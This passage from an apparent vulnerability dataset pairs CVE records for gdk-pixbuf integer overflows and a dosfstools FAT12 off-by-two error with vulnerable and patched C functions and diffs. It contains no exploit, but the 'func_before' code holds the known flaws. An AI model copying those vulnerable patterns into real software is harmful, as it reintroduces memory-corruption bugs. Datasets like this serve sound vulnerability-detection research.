(tmp >> 8) + 0x80) >> 8);\n                  tmp = ((int) p[1] - g2) * a0;\n                  dest[1] = g2 + ((tmp + (tmp >> 8) + 0x80) >> 8);\n                  tmp = ((int) p[2] - b2) * a0;\n                  dest[2] = b2 + ((tmp + (tmp >> 8) + 0x80) >> 8);\n                }\n              else\n                {\n                  tmp = ((int) p[0] - r1) * a0;\n                  dest[0] = r1 + ((tmp + (tmp >> 8) + 0x80) >> 8);\n                  tmp = ((int) p[1] - g1) * a0;\n                  dest[1] = g1 + ((tmp + (tmp >> 8) + 0x80) >> 8);\n                  tmp = ((int) p[2] - b1) * a0;\n                  dest[2] = b1 + ((tmp + (tmp >> 8) + 0x80) >> 8);\n                }\n\t\t     }\n              break;\n            }\n\t  \n\t  if (dest_channels == 4)\n\t    dest[3] = 0xff;\n\n\t\t j++;\n\t);\n    }\n}",
        "func": "static void\npixops_composite_color_nearest (guchar        *dest_buf,\n\t\t\t\tint            render_x0,\n\t\t\t\tint            render_y0,\n\t\t\t\tint            render_x1,\n\t\t\t\tint            render_y1,\n\t\t\t\tint            dest_rowstride,\n\t\t\t\tint            dest_channels,\n\t\t\t\tgboolean       dest_has_alpha,\n\t\t\t\tconst guchar  *src_buf,\n\t\t\t\tint            src_width,\n\t\t\t\tint            src_height,\n\t\t\t\tint            src_rowstride,\n\t\t\t\tint            src_channels,\n\t\t\t\tgboolean       src_has_alpha,\n\t\t\t\tdouble         scale_x,\n\t\t\t\tdouble         scale_y,\n\t\t\t\tint            overall_alpha,\n\t\t\t\tint            check_x,\n\t\t\t\tint            check_y,\n\t\t\t\tint            check_size,\n\t\t\t\tguint32        color1,\n\t\t\t\tguint32        color2)\n{\n  gint64 i, j;\n  gint64 x;\n  gint64 x_step = (1 << SCALE_SHIFT) / scale_x;\n  gint64 y_step = (1 << SCALE_SHIFT) / scale_y;\n  int r1, g1, b1, r2, g2, b2;\n  int check_shift = get_check_shift (check_size);\n  gint64 xmax, xstart, xstop, x_pos, y_pos;\n  const guchar *p;\n  unsigned int  a0;\n\n  for (i = 0; i < (render_y1 - render_y0); i++)\n    {\n      const guchar *src;\n      guchar       *dest;\n      y_pos = ((i + render_y0) * y_step + y_step / 2) >> SCALE_SHIFT;\n      y_pos = CLAMP (y_pos, 0, src_height - 1);\n      src  = src_buf + (gsize)y_pos * src_rowstride;\n      dest = dest_buf + (gsize)i * dest_rowstride;\n\n      x = render_x0 * x_step + x_step / 2;\n      \n      \n      if (((i + check_y) >> check_shift) & 1)\n\t{\n\t  r1 = (color2 & 0xff0000) >> 16;\n\t  g1 = (color2 & 0xff00) >> 8;\n\t  b1 = color2 & 0xff;\n\n\t  r2 = (color1 & 0xff0000) >> 16;\n\t  g2 = (color1 & 0xff00) >> 8;\n\t  b2 = color1 & 0xff;\n\t}\n      else\n\t{\n\t  r1 = (color1 & 0xff0000) >> 16;\n\t  g1 = (color1 & 0xff00) >> 8;\n\t  b1 = color1 & 0xff;\n\n\t  r2 = (color2 & 0xff0000) >> 16;\n\t  g2 = (color2 & 0xff00) >> 8;\n\t  b2 = color2 & 0xff;\n\t}\n\n      j = 0;\n      INNER_LOOP(src_channels, dest_channels,\n\t  if (src_has_alpha)\n\t    a0 = (p[3] * overall_alpha + 0xff) >> 8;\n\t  else\n\t    a0 = overall_alpha;\n\n          switch (a0)\n            {\n            case 0:\n              if (((j + check_x) >> check_shift) & 1)\n                {\n                  dest[0] = r2; \n                  dest[1] = g2; \n                  dest[2] = b2;\n                }\n              else\n                {\n                  dest[0] = r1; \n                  dest[1] = g1; \n                  dest[2] = b1;\n                }\n            break;\n            case 255:\n\t      dest[0] = p[0];\n\t      dest[1] = p[1];\n\t      dest[2] = p[2];\n              break;\n            default:\n\t\t     {\n\t\t       unsigned int tmp;\n              if (((j + check_x) >> check_shift) & 1)\n                {\n                  tmp = ((int) p[0] - r2) * a0;\n                  dest[0] = r2 + ((tmp + (tmp >> 8) + 0x80) >> 8);\n                  tmp = ((int) p[1] - g2) * a0;\n                  dest[1] = g2 + ((tmp + (tmp >> 8) + 0x80) >> 8);\n                  tmp = ((int) p[2] - b2) * a0;\n                  dest[2] = b2 + ((tmp + (tmp >> 8) + 0x80) >> 8);\n                }\n              else\n                {\n                  tmp = ((int) p[0] - r1) * a0;\n                  dest[0] = r1 + ((tmp + (tmp >> 8) + 0x80) >> 8);\n                  tmp = ((int) p[1] - g1) * a0;\n                  dest[1] = g1 + ((tmp + (tmp >> 8) + 0x80) >> 8);\n                  tmp = ((int) p[2] - b1) * a0;\n                  dest[2] = b1 + ((tmp + (tmp >> 8) + 0x80) >> 8);\n                }\n\t\t     }\n              break;\n            }\n\t  \n\t  if (dest_channels == 4)\n\t    dest[3] = 0xff;\n\n\t\t j++;\n\t);\n    }\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -22,13 +22,13 @@\n \t\t\t\tguint32        color1,\n \t\t\t\tguint32        color2)\n {\n-  int i, j;\n-  int x;\n-  int x_step = (1 << SCALE_SHIFT) / scale_x;\n-  int y_step = (1 << SCALE_SHIFT) / scale_y;\n+  gint64 i, j;\n+  gint64 x;\n+  gint64 x_step = (1 << SCALE_SHIFT) / scale_x;\n+  gint64 y_step = (1 << SCALE_SHIFT) / scale_y;\n   int r1, g1, b1, r2, g2, b2;\n   int check_shift = get_check_shift (check_size);\n-  int xmax, xstart, xstop, x_pos, y_pos;\n+  gint64 xmax, xstart, xstop, x_pos, y_pos;\n   const guchar *p;\n   unsigned int  a0;\n ",
        "diff_line_info": {
            "deleted_lines": [
                "  int i, j;",
                "  int x;",
                "  int x_step = (1 << SCALE_SHIFT) / scale_x;",
                "  int y_step = (1 << SCALE_SHIFT) / scale_y;",
                "  int xmax, xstart, xstop, x_pos, y_pos;"
            ],
            "added_lines": [
                "  gint64 i, j;",
                "  gint64 x;",
                "  gint64 x_step = (1 << SCALE_SHIFT) / scale_x;",
                "  gint64 y_step = (1 << SCALE_SHIFT) / scale_y;",
                "  gint64 xmax, xstart, xstop, x_pos, y_pos;"
            ]
        }
    },
    {
        "cve_id": "CVE-2015-8875",
        "func_name": "GNOME/gdk-pixbuf/pixops_composite_nearest",
        "description": "Multiple integer overflows in the (1) pixops_composite_nearest, (2) pixops_composite_color_nearest, and (3) pixops_process functions in pixops/pixops.c in gdk-pixbuf before 2.33.1 allow remote attackers to cause a denial of service (application crash) or possibly execute arbitrary code via a crafted image, which triggers a heap-based buffer overflow.",
        "git_url": "https://github.com/GNOME/gdk-pixbuf/commit/dbfe8f70471864818bf458a39c8a99640895bd22",
        "commit_title": "pixops: use gint64 in more places to avoid overflow when shifting",
        "commit_text": "",
        "func_before": "static void\npixops_composite_nearest (guchar        *dest_buf,\n\t\t\t  int            render_x0,\n\t\t\t  int            render_y0,\n\t\t\t  int            render_x1,\n\t\t\t  int            render_y1,\n\t\t\t  int            dest_rowstride,\n\t\t\t  int            dest_channels,\n\t\t\t  gboolean       dest_has_alpha,\n\t\t\t  const guchar  *src_buf,\n\t\t\t  int            src_width,\n\t\t\t  int            src_height,\n\t\t\t  int            src_rowstride,\n\t\t\t  int            src_channels,\n\t\t\t  gboolean       src_has_alpha,\n\t\t\t  double         scale_x,\n\t\t\t  double         scale_y,\n\t\t\t  int            overall_alpha)\n{\n  int i;\n  int x;\n  int x_step = (1 << SCALE_SHIFT) / scale_x;\n  int y_step = (1 << SCALE_SHIFT) / scale_y;\n  int xmax, xstart, xstop, x_pos, y_pos;\n  const guchar *p;\n  unsigned int  a0;\n\n  for (i = 0; i < (render_y1 - render_y0); i++)\n    {\n      const guchar *src;\n      guchar       *dest;\n      y_pos = ((i + render_y0) * y_step + y_step / 2) >> SCALE_SHIFT;\n      y_pos = CLAMP (y_pos, 0, src_height - 1);\n      src  = src_buf + (gsize)y_pos * src_rowstride;\n      dest = dest_buf + (gsize)i * dest_rowstride;\n\n      x = render_x0 * x_step + x_step / 2;\n      \n      INNER_LOOP(src_channels, dest_channels,\n\t  if (src_has_alpha)\n\t    a0 = (p[3] * overall_alpha) / 0xff;\n\t  else\n\t    a0 = overall_alpha;\n\n          switch (a0)\n            {\n            case 0:\n              break;\n            case 255:\n              dest[0] = p[0];\n              dest[1] = p[1];\n              dest[2] = p[2];\n              if (dest_has_alpha)\n                dest[3] = 0xff;\n              break;\n            default:\n              if (dest_has_alpha)\n                {\n                  unsigned int w0 = 0xff * a0;\n                  unsigned int w1 = (0xff - a0) * dest[3];\n                  unsigned int w = w0 + w1;\n\n\t\t  dest[0] = (w0 * p[0] + w1 * dest[0]) / w;\n\t\t  dest[1] = (w0 * p[1] + w1 * dest[1]) / w;\n\t\t  dest[2] = (w0 * p[2] + w1 * dest[2]) / w;\n\t\t  dest[3] = w / 0xff;\n                }\n              else\n                {\n                  unsigned int a1 = 0xff - a0;\n\t\t  unsigned int tmp;\n\n\t\t  tmp = a0 * p[0] + a1 * dest[0] + 0x80;\n                  dest[0] = (tmp + (tmp >> 8)) >> 8;\n\t\t  tmp = a0 * p[1] + a1 * dest[1] + 0x80;\n                  dest[1] = (tmp + (tmp >> 8)) >> 8;\n\t\t  tmp = a0 * p[2] + a1 * dest[2] + 0x80;\n                  dest[2] = (tmp + (tmp >> 8)) >> 8;\n                }\n              break;\n            }\n\t);\n    }\n}",
        "func": "static void\npixops_composite_nearest (guchar        *dest_buf,\n\t\t\t  int            render_x0,\n\t\t\t  int            render_y0,\n\t\t\t  int            render_x1,\n\t\t\t  int            render_y1,\n\t\t\t  int            dest_rowstride,\n\t\t\t  int            dest_channels,\n\t\t\t  gboolean       dest_has_alpha,\n\t\t\t  const guchar  *src_buf,\n\t\t\t  int            src_width,\n\t\t\t  int            src_height,\n\t\t\t  int            src_rowstride,\n\t\t\t  int            src_channels,\n\t\t\t  gboolean       src_has_alpha,\n\t\t\t  double         scale_x,\n\t\t\t  double         scale_y,\n\t\t\t  int            overall_alpha)\n{\n  gint64 i;\n  gint64 x;\n  gint64 x_step = (1 << SCALE_SHIFT) / scale_x;\n  gint64 y_step = (1 << SCALE_SHIFT) / scale_y;\n  gint64 xmax, xstart, xstop, x_pos, y_pos;\n  const guchar *p;\n  unsigned int  a0;\n\n  for (i = 0; i < (render_y1 - render_y0); i++)\n    {\n      const guchar *src;\n      guchar       *dest;\n      y_pos = ((i + render_y0) * y_step + y_step / 2) >> SCALE_SHIFT;\n      y_pos = CLAMP (y_pos, 0, src_height - 1);\n      src  = src_buf + (gsize)y_pos * src_rowstride;\n      dest = dest_buf + (gsize)i * dest_rowstride;\n\n      x = render_x0 * x_step + x_step / 2;\n      \n      INNER_LOOP(src_channels, dest_channels,\n\t  if (src_has_alpha)\n\t    a0 = (p[3] * overall_alpha) / 0xff;\n\t  else\n\t    a0 = overall_alpha;\n\n          switch (a0)\n            {\n            case 0:\n              break;\n            case 255:\n              dest[0] = p[0];\n              dest[1] = p[1];\n              dest[2] = p[2];\n              if (dest_has_alpha)\n                dest[3] = 0xff;\n              break;\n            default:\n              if (dest_has_alpha)\n                {\n                  unsigned int w0 = 0xff * a0;\n                  unsigned int w1 = (0xff - a0) * dest[3];\n                  unsigned int w = w0 + w1;\n\n\t\t  dest[0] = (w0 * p[0] + w1 * dest[0]) / w;\n\t\t  dest[1] = (w0 * p[1] + w1 * dest[1]) / w;\n\t\t  dest[2] = (w0 * p[2] + w1 * dest[2]) / w;\n\t\t  dest[3] = w / 0xff;\n                }\n              else\n                {\n                  unsigned int a1 = 0xff - a0;\n\t\t  unsigned int tmp;\n\n\t\t  tmp = a0 * p[0] + a1 * dest[0] + 0x80;\n                  dest[0] = (tmp + (tmp >> 8)) >> 8;\n\t\t  tmp = a0 * p[1] + a1 * dest[1] + 0x80;\n                  dest[1] = (tmp + (tmp >> 8)) >> 8;\n\t\t  tmp = a0 * p[2] + a1 * dest[2] + 0x80;\n                  dest[2] = (tmp + (tmp >> 8)) >> 8;\n                }\n              break;\n            }\n\t);\n    }\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -17,11 +17,11 @@\n \t\t\t  double         scale_y,\n \t\t\t  int            overall_alpha)\n {\n-  int i;\n-  int x;\n-  int x_step = (1 << SCALE_SHIFT) / scale_x;\n-  int y_step = (1 << SCALE_SHIFT) / scale_y;\n-  int xmax, xstart, xstop, x_pos, y_pos;\n+  gint64 i;\n+  gint64 x;\n+  gint64 x_step = (1 << SCALE_SHIFT) / scale_x;\n+  gint64 y_step = (1 << SCALE_SHIFT) / scale_y;\n+  gint64 xmax, xstart, xstop, x_pos, y_pos;\n   const guchar *p;\n   unsigned int  a0;\n ",
        "diff_line_info": {
            "deleted_lines": [
                "  int i;",
                "  int x;",
                "  int x_step = (1 << SCALE_SHIFT) / scale_x;",
                "  int y_step = (1 << SCALE_SHIFT) / scale_y;",
                "  int xmax, xstart, xstop, x_pos, y_pos;"
            ],
            "added_lines": [
                "  gint64 i;",
                "  gint64 x;",
                "  gint64 x_step = (1 << SCALE_SHIFT) / scale_x;",
                "  gint64 y_step = (1 << SCALE_SHIFT) / scale_y;",
                "  gint64 xmax, xstart, xstop, x_pos, y_pos;"
            ]
        }
    },
    {
        "cve_id": "CVE-2015-8875",
        "func_name": "GNOME/gdk-pixbuf/pixops_process",
        "description": "Multiple integer overflows in the (1) pixops_composite_nearest, (2) pixops_composite_color_nearest, and (3) pixops_process functions in pixops/pixops.c in gdk-pixbuf before 2.33.1 allow remote attackers to cause a denial of service (application crash) or possibly execute arbitrary code via a crafted image, which triggers a heap-based buffer overflow.",
        "git_url": "https://github.com/GNOME/gdk-pixbuf/commit/dbfe8f70471864818bf458a39c8a99640895bd22",
        "commit_title": "pixops: use gint64 in more places to avoid overflow when shifting",
        "commit_text": "",
        "func_before": "static void\npixops_process (guchar         *dest_buf,\n\t\tint             render_x0,\n\t\tint             render_y0,\n\t\tint             render_x1,\n\t\tint             render_y1,\n\t\tint             dest_rowstride,\n\t\tint             dest_channels,\n\t\tgboolean        dest_has_alpha,\n\t\tconst guchar   *src_buf,\n\t\tint             src_width,\n\t\tint             src_height,\n\t\tint             src_rowstride,\n\t\tint             src_channels,\n\t\tgboolean        src_has_alpha,\n\t\tdouble          scale_x,\n\t\tdouble          scale_y,\n\t\tint             check_x,\n\t\tint             check_y,\n\t\tint             check_size,\n\t\tguint32         color1,\n\t\tguint32         color2,\n\t\tPixopsFilter   *filter,\n\t\tPixopsLineFunc  line_func,\n\t\tPixopsPixelFunc pixel_func)\n{\n  int i, j;\n  int x, y;\t\t\t/* X and Y position in source (fixed_point) */\n\n  guchar **line_bufs;\n  int *filter_weights;\n\n  int x_step;\n  int y_step;\n\n  int check_shift;\n  int scaled_x_offset;\n\n  int run_end_x;\n  int run_end_index;\n\n  x_step = (1 << SCALE_SHIFT) / scale_x; /* X step in source (fixed point) */\n  y_step = (1 << SCALE_SHIFT) / scale_y; /* Y step in source (fixed point) */\n\n  if (x_step == 0 || y_step == 0)\n    return; /* overflow, bail out */\n\n  filter_weights = make_filter_table (filter);\n  if (!filter_weights)\n    return; /* overflow, bail out */\n\n  line_bufs = g_new (guchar *, filter->y.n);\n\n  check_shift = check_size ? get_check_shift (check_size) : 0;\n\n  scaled_x_offset = floor (filter->x.offset * (1 << SCALE_SHIFT));\n\n  /* Compute the index where we run off the end of the source buffer. The\n   * furthest source pixel we access at index i is:\n   *\n   *  ((render_x0 + i) * x_step + scaled_x_offset) >> SCALE_SHIFT + filter->x.n - 1\n   *\n   * So, run_end_index is the smallest i for which this pixel is src_width,\n   * i.e, for which:\n   *\n   *  (i + render_x0) * x_step >= ((src_width - filter->x.n + 1) << SCALE_SHIFT) - scaled_x_offset\n   *\n   */\n#define MYDIV(a,b) ((a) > 0 ? (a) / (b) : ((a) - (b) + 1) / (b))    /* Division so that -1/5 = -1 */\n\n  run_end_x = (((src_width - filter->x.n + 1) << SCALE_SHIFT) - scaled_x_offset);\n  run_end_index = MYDIV (run_end_x + x_step - 1, x_step) - render_x0;\n  run_end_index = MIN (run_end_index, render_x1 - render_x0);\n\n  y = render_y0 * y_step + floor (filter->y.offset * (1 << SCALE_SHIFT));\n  for (i = 0; i < (render_y1 - render_y0); i++)\n    {\n      int dest_x;\n      int y_start = y >> SCALE_SHIFT;\n      int x_start;\n      int *run_weights = filter_weights +\n                         ((y >> (SCALE_SHIFT - SUBSAMPLE_BITS)) & SUBSAMPLE_MASK) *\n                         filter->x.n * filter->y.n * SUBSAMPLE;\n      guchar *new_outbuf;\n      guint32 tcolor1, tcolor2;\n\n      guchar *outbuf = dest_buf + (gsize)dest_rowstride * i;\n      guchar *outbuf_end = outbuf + dest_channels * (render_x1 - render_x0);\n\n      if (((i + check_y) >> check_shift) & 1)\n\t{\n\t  tcolor1 = color2;\n\t  tcolor2 = color1;\n\t}\n      else\n\t{\n\t  tcolor1 = color1;\n\t  tcolor2 = color2;\n\t}\n\n      for (j=0; j<filter->y.n; j++)\n\t{\n\t  if (y_start <  0)\n\t    line_bufs[j] = (guchar *)src_buf;\n\t  else if (y_start < src_height)\n\t    line_bufs[j] = (guchar *)src_buf + (gsize)src_rowstride * y_start;\n\t  else\n\t    line_bufs[j] = (guchar *)src_buf + (gsize)src_rowstride * (src_height - 1);\n\n\t  y_start++;\n\t}\n\n      dest_x = check_x;\n      x = render_x0 * x_step + scaled_x_offset;\n      x_start = x >> SCALE_SHIFT;\n\n      while (x_start < 0 && outbuf < outbuf_end)\n\t{\n\t  process_pixel (run_weights + ((x >> (SCALE_SHIFT - SUBSAMPLE_BITS)) & SUBSAMPLE_MASK) * (filter->x.n * filter->y.n), filter->x.n, filter->y.n,\n\t\t\t outbuf, dest_x, dest_channels, dest_has_alpha,\n\t\t\t line_bufs, src_channels, src_has_alpha,\n\t\t\t x >> SCALE_SHIFT, src_width,\n\t\t\t check_size, tcolor1, tcolor2, pixel_func);\n\n\t  x += x_step;\n\t  x_start = x >> SCALE_SHIFT;\n\t  dest_x++;\n\t  outbuf += dest_channels;\n\t}\n\n      new_outbuf = (*line_func) (run_weights, filter->x.n, filter->y.n,\n\t\t\t\t outbuf, dest_x, dest_buf + (gsize)dest_rowstride *\n\t\t\t\t i + run_end_index * dest_channels,\n\t\t\t\t dest_channels, dest_has_alpha,\n\t\t\t\t line_bufs, src_channels, src_has_alpha,\n\t\t\t\t x, x_step, src_width, check_size, tcolor1,\n\t\t\t\t tcolor2);\n\n      dest_x += (new_outbuf - outbuf) / dest_channels;\n\n      x = (dest_x - check_x + render_x0) * x_step + scaled_x_offset;\n      outbuf = new_outbuf;\n\n      while (outbuf < outbuf_end)\n\t{\n\t  process_pixel (run_weights + ((x >> (SCALE_SHIFT - SUBSAMPLE_BITS)) & SUBSAMPLE_MASK) * (filter->x.n * filter->y.n), filter->x.n, filter->y.n,\n\t\t\t outbuf, dest_x, dest_channels, dest_has_alpha,\n\t\t\t line_bufs, src_channels, src_has_alpha,\n\t\t\t x >> SCALE_SHIFT, src_width,\n\t\t\t check_size, tcolor1, tcolor2, pixel_func);\n\n\t  x += x_step;\n\t  dest_x++;\n\t  outbuf += dest_channels;\n\t}\n\n      y += y_step;\n    }\n\n  g_free (line_bufs);\n  g_free (filter_weights);\n}",
        "func": "static void\npixops_process (guchar         *dest_buf,\n\t\tint             render_x0,\n\t\tint             render_y0,\n\t\tint             render_x1,\n\t\tint             render_y1,\n\t\tint             dest_rowstride,\n\t\tint             dest_channels,\n\t\tgboolean        dest_has_alpha,\n\t\tconst guchar   *src_buf,\n\t\tint             src_width,\n\t\tint             src_height,\n\t\tint             src_rowstride,\n\t\tint             src_channels,\n\t\tgboolean        src_has_alpha,\n\t\tdouble          scale_x,\n\t\tdouble          scale_y,\n\t\tint             check_x,\n\t\tint             check_y,\n\t\tint             check_size,\n\t\tguint32         color1,\n\t\tguint32         color2,\n\t\tPixopsFilter   *filter,\n\t\tPixopsLineFunc  line_func,\n\t\tPixopsPixelFunc pixel_func)\n{\n  gint64 i, j;\n  gint64 x, y;\t\t\t/* X and Y position in source (fixed_point) */\n\n  guchar **line_bufs;\n  int *filter_weights;\n\n  gint64 x_step;\n  gint64 y_step;\n\n  int check_shift;\n  gint64 scaled_x_offset;\n\n  gint64 run_end_x;\n  gint64 run_end_index;\n\n  x_step = (1 << SCALE_SHIFT) / scale_x; /* X step in source (fixed point) */\n  y_step = (1 << SCALE_SHIFT) / scale_y; /* Y step in source (fixed point) */\n\n  if (x_step == 0 || y_step == 0)\n    return; /* overflow, bail out */\n\n  filter_weights = make_filter_table (filter);\n  if (!filter_weights)\n    return; /* overflow, bail out */\n\n  line_bufs = g_new (guchar *, filter->y.n);\n\n  check_shift = check_size ? get_check_shift (check_size) : 0;\n\n  scaled_x_offset = floor (filter->x.offset * (1 << SCALE_SHIFT));\n\n  /* Compute the index where we run off the end of the source buffer. The\n   * furthest source pixel we access at index i is:\n   *\n   *  ((render_x0 + i) * x_step + scaled_x_offset) >> SCALE_SHIFT + filter->x.n - 1\n   *\n   * So, run_end_index is the smallest i for which this pixel is src_width,\n   * i.e, for which:\n   *\n   *  (i + render_x0) * x_step >= ((src_width - filter->x.n + 1) << SCALE_SHIFT) - scaled_x_offset\n   *\n   */\n#define MYDIV(a,b) ((a) > 0 ? (a) / (b) : ((a) - (b) + 1) / (b))    /* Division so that -1/5 = -1 */\n\n  run_end_x = (((src_width - filter->x.n + 1) << SCALE_SHIFT) - scaled_x_offset);\n  run_end_index = MYDIV (run_end_x + x_step - 1, x_step) - render_x0;\n  run_end_index = MIN (run_end_index, render_x1 - render_x0);\n\n  y = render_y0 * y_step + floor (filter->y.offset * (1 << SCALE_SHIFT));\n  for (i = 0; i < (render_y1 - render_y0); i++)\n    {\n      int dest_x;\n      int y_start = y >> SCALE_SHIFT;\n      int x_start;\n      int *run_weights = filter_weights +\n                         ((y >> (SCALE_SHIFT - SUBSAMPLE_BITS)) & SUBSAMPLE_MASK) *\n                         filter->x.n * filter->y.n * SUBSAMPLE;\n      guchar *new_outbuf;\n      guint32 tcolor1, tcolor2;\n\n      guchar *outbuf = dest_buf + (gsize)dest_rowstride * i;\n      guchar *outbuf_end = outbuf + dest_channels * (render_x1 - render_x0);\n\n      if (((i + check_y) >> check_shift) & 1)\n\t{\n\t  tcolor1 = color2;\n\t  tcolor2 = color1;\n\t}\n      else\n\t{\n\t  tcolor1 = color1;\n\t  tcolor2 = color2;\n\t}\n\n      for (j=0; j<filter->y.n; j++)\n\t{\n\t  if (y_start <  0)\n\t    line_bufs[j] = (guchar *)src_buf;\n\t  else if (y_start < src_height)\n\t    line_bufs[j] = (guchar *)src_buf + (gsize)src_rowstride * y_start;\n\t  else\n\t    line_bufs[j] = (guchar *)src_buf + (gsize)src_rowstride * (src_height - 1);\n\n\t  y_start++;\n\t}\n\n      dest_x = check_x;\n      x = render_x0 * x_step + scaled_x_offset;\n      x_start = x >> SCALE_SHIFT;\n\n      while (x_start < 0 && outbuf < outbuf_end)\n\t{\n\t  process_pixel (run_weights + ((x >> (SCALE_SHIFT - SUBSAMPLE_BITS)) & SUBSAMPLE_MASK) * (filter->x.n * filter->y.n), filter->x.n, filter->y.n,\n\t\t\t outbuf, dest_x, dest_channels, dest_has_alpha,\n\t\t\t line_bufs, src_channels, src_has_alpha,\n\t\t\t x >> SCALE_SHIFT, src_width,\n\t\t\t check_size, tcolor1, tcolor2, pixel_func);\n\n\t  x += x_step;\n\t  x_start = x >> SCALE_SHIFT;\n\t  dest_x++;\n\t  outbuf += dest_channels;\n\t}\n\n      new_outbuf = (*line_func) (run_weights, filter->x.n, filter->y.n,\n\t\t\t\t outbuf, dest_x, dest_buf + (gsize)dest_rowstride *\n\t\t\t\t i + run_end_index * dest_channels,\n\t\t\t\t dest_channels, dest_has_alpha,\n\t\t\t\t line_bufs, src_channels, src_has_alpha,\n\t\t\t\t x, x_step, src_width, check_size, tcolor1,\n\t\t\t\t tcolor2);\n\n      dest_x += (new_outbuf - outbuf) / dest_channels;\n\n      x = (dest_x - check_x + render_x0) * x_step + scaled_x_offset;\n      outbuf = new_outbuf;\n\n      while (outbuf < outbuf_end)\n\t{\n\t  process_pixel (run_weights + ((x >> (SCALE_SHIFT - SUBSAMPLE_BITS)) & SUBSAMPLE_MASK) * (filter->x.n * filter->y.n), filter->x.n, filter->y.n,\n\t\t\t outbuf, dest_x, dest_channels, dest_has_alpha,\n\t\t\t line_bufs, src_channels, src_has_alpha,\n\t\t\t x >> SCALE_SHIFT, src_width,\n\t\t\t check_size, tcolor1, tcolor2, pixel_func);\n\n\t  x += x_step;\n\t  dest_x++;\n\t  outbuf += dest_channels;\n\t}\n\n      y += y_step;\n    }\n\n  g_free (line_bufs);\n  g_free (filter_weights);\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -24,20 +24,20 @@\n \t\tPixopsLineFunc  line_func,\n \t\tPixopsPixelFunc pixel_func)\n {\n-  int i, j;\n-  int x, y;\t\t\t/* X and Y position in source (fixed_point) */\n+  gint64 i, j;\n+  gint64 x, y;\t\t\t/* X and Y position in source (fixed_point) */\n \n   guchar **line_bufs;\n   int *filter_weights;\n \n-  int x_step;\n-  int y_step;\n+  gint64 x_step;\n+  gint64 y_step;\n \n   int check_shift;\n-  int scaled_x_offset;\n+  gint64 scaled_x_offset;\n \n-  int run_end_x;\n-  int run_end_index;\n+  gint64 run_end_x;\n+  gint64 run_end_index;\n \n   x_step = (1 << SCALE_SHIFT) / scale_x; /* X step in source (fixed point) */\n   y_step = (1 << SCALE_SHIFT) / scale_y; /* Y step in source (fixed point) */",
        "diff_line_info": {
            "deleted_lines": [
                "  int i, j;",
                "  int x, y;\t\t\t/* X and Y position in source (fixed_point) */",
                "  int x_step;",
                "  int y_step;",
                "  int scaled_x_offset;",
                "  int run_end_x;",
                "  int run_end_index;"
            ],
            "added_lines": [
                "  gint64 i, j;",
                "  gint64 x, y;\t\t\t/* X and Y position in source (fixed_point) */",
                "  gint64 x_step;",
                "  gint64 y_step;",
                "  gint64 scaled_x_offset;",
                "  gint64 run_end_x;",
                "  gint64 run_end_index;"
            ]
        }
    },
    {
        "cve_id": "CVE-2015-8872",
        "func_name": "dosfstools/set_fat",
        "description": "The set_fat function in fat.c in dosfstools before 4.0 might allow attackers to corrupt a FAT12 filesystem or cause a denial of service (invalid memory read and crash) by writing an odd number of clusters to the third to last entry on a FAT12 filesystem, which triggers an \"off-by-two error.\"",
        "git_url": "https://github.com/dosfstools/dosfstools/commit/07908124838afcc99c577d1d3e84cef2dbd39cb7",
        "commit_title": "set_fat(): Fix off-by-2 error leading to corruption in FAT12",
        "commit_text": " In FAT12 two 12 bit entries are combined to a 24 bit value (three bytes). Therefore, when an even numbered FAT entry is set in FAT12, it must be be combined with the following entry. To prevent accessing beyond the end of the FAT array, it must be checked that the cluster is not the last one.  Previously, the check tested that the requested cluster was equal to fs->clusters - 1. However, fs->clusters is the number of data clusters not including the two reserved FAT entries at the start so the test triggered two clusters early.  If the third to last entry was written on a FAT12 filesystem with an odd number of clusters, the second to last entry would be corrupted. This corruption may also lead to invalid memory accesses when the corrupted entry becomes out of bounds and is used later.  Change the test to fs->clusters + 1 to fix. ",
        "func_before": "void set_fat(DOS_FS * fs, uint32_t cluster, int32_t new)\n{\n    unsigned char *data = NULL;\n    int size;\n    loff_t offs;\n\n    if (new == -1)\n\tnew = FAT_EOF(fs);\n    else if ((long)new == -2)\n\tnew = FAT_BAD(fs);\n    switch (fs->fat_bits) {\n    case 12:\n\tdata = fs->fat + cluster * 3 / 2;\n\toffs = fs->fat_start + cluster * 3 / 2;\n\tif (cluster & 1) {\n\t    FAT_ENTRY prevEntry;\n\t    get_fat(&prevEntry, fs->fat, cluster - 1, fs);\n\t    data[0] = ((new & 0xf) << 4) | (prevEntry.value >> 8);\n\t    data[1] = new >> 4;\n\t} else {\n\t    FAT_ENTRY subseqEntry;\n\t    if (cluster != fs->clusters - 1)\n\t\tget_fat(&subseqEntry, fs->fat, cluster + 1, fs);\n\t    else\n\t\tsubseqEntry.value = 0;\n\t    data[0] = new & 0xff;\n\t    data[1] = (new >> 8) | ((0xff & subseqEntry.value) << 4);\n\t}\n\tsize = 2;\n\tbreak;\n    case 16:\n\tdata = fs->fat + cluster * 2;\n\toffs = fs->fat_start + cluster * 2;\n\t*(unsigned short *)data = htole16(new);\n\tsize = 2;\n\tbreak;\n    case 32:\n\t{\n\t    FAT_ENTRY curEntry;\n\t    get_fat(&curEntry, fs->fat, cluster, fs);\n\n\t    data = fs->fat + cluster * 4;\n\t    offs = fs->fat_start + cluster * 4;\n\t    /* According to M$, the high 4 bits of a FAT32 entry are reserved and\n\t     * are not part of the cluster number. So we never touch them. */\n\t    *(uint32_t *)data = htole32((new & 0xfffffff) |\n\t\t\t\t\t     (curEntry.reserved << 28));\n\t    size = 4;\n\t}\n\tbreak;\n    default:\n\tdie(\"Bad FAT entry size: %d bits.\", fs->fat_bits);\n    }\n    fs_write(offs, size, data);\n    if (fs->nfats > 1) {\n\tfs_write(offs + fs->fat_size, size, data);\n    }\n}",
